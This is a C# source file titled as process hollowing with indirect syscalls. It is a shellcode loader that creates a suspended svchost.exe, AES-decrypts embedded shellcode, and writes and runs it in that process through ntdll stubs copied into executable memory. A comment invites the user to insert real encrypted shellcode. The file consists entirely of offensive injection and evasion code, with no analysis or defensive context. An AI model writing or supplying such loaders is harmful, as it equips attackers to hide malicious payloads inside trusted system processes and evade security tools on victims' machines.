// Advanced Process Hollowing with Indirect Syscalls
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace AdvancedProcessHollowing
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtCreateThreadExDelegate(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maxStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtWriteVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            uint BufferLength,
            out UIntPtr BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtProtectVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref UIntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        static void Main()
        {
            string target = "C:\\Windows\\System32\\svchost.exe";

            // Setup process creation
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            // Create suspended process
            bool created = CreateProcess(null, target, ref pSec, ref tSec, false,
                0x00080000 | 0x00000004, IntPtr.Zero, null, ref sInfoEx, out pInfo);
            if (!created)
            {
                Console.WriteLine($"[-] Failed to create process: {GetLastError()}");
                return;
            }
            Console.WriteLine("[+] Suspended process created");

            // Replace with your real encrypted shellcode, key and IV
            byte[] encryptedShellcode = new byte[] { 0xef };
            byte[] aesKey = new byte[] { 0x19, 0x12, 0xc4, 0x6f, 0xb1, 0x06, 0x16, 0x5d, 0x49, 0x3e, 0xb5, 0x37, 0xd1, 0x91, 0xaf, 0xe6, 0xa7, 0x68, 0xb3, 0x4a, 0x70, 0x76, 0x45, 0xd5, 0xf9, 0xde, 0xc3, 0x24, 0x97, 0x12, 0xb6, 0xf0 };
            byte[] aesIV = new byte[] { 0x76, 0x6e, 0x3a, 0x2e, 0x03, 0x9b, 0x7e, 0xb7, 0xbe, 0x31, 0x88, 0x66, 0xef, 0xf1, 0xeb, 0x52 };
            byte[] shellcode = AESDecrypt(encryptedShellcode, aesKey, aesIV);

            // Allocate memory
            IntPtr baseAddress = IntPtr.Zero;
            UIntPtr regionSize = (UIntPtr)shellcode.Length;
            var alloc = (NtAllocateVirtualMemoryDelegate)GetSyscallDelegate("NtAllocateVirtualMemory", typeof(NtAllocateVirtualMemoryDelegate));
            alloc(pInfo.hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, 0x3000, 0x40);
            Console.WriteLine("[+] Memory allocated");

            // Write shellcode
            var writer = (NtWriteVirtualMemoryDelegate)GetSyscallDelegate("NtWriteVirtualMemory", typeof(NtWriteVirtualMemoryDelegate));
            writer(pInfo.hProcess, baseAddress, shellcode, (uint)shellcode.Length, out _);

            // Change protection to RX
            var protector = (NtProtectVirtualMemoryDelegate)GetSyscallDelegate("NtProtectVirtualMemory", typeof(NtProtectVirtualMemoryDelegate));
            protector(pInfo.hProcess, ref baseAddress, ref regionSize, 0x20, out _);

            // Launch
            var launcher = (NtCreateThreadExDelegate)GetSyscallDelegate("NtCreateThreadEx", typeof(NtCreateThreadExDelegate));
            launcher(out _, 0x1FFFFF, IntPtr.Zero, pInfo.hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] Shellcode executed");
        }

        static object GetSyscallDelegate(string functionName, Type delegateType)
        {
            string path = Environment.SystemDirectory + "\\ntdll.dll";
            IntPtr ntdll = LoadLibrary(path);
            IntPtr funcPtr = GetProcAddress(ntdll, functionName);
            byte[] stub = new byte[32];
            Marshal.Copy(funcPtr, stub, 0, stub.Length);
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, 0x1000 | 0x2000, 0x40);
            Marshal.Copy(stub, 0, mem, stub.Length);
            return Marshal.GetDelegateForFunctionPointer(mem, delegateType);
        }

        static byte[] AESDecrypt(byte[] cipher, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(cipher, 0, cipher.Length);
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
            string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern uint GetLastError();
    }
}
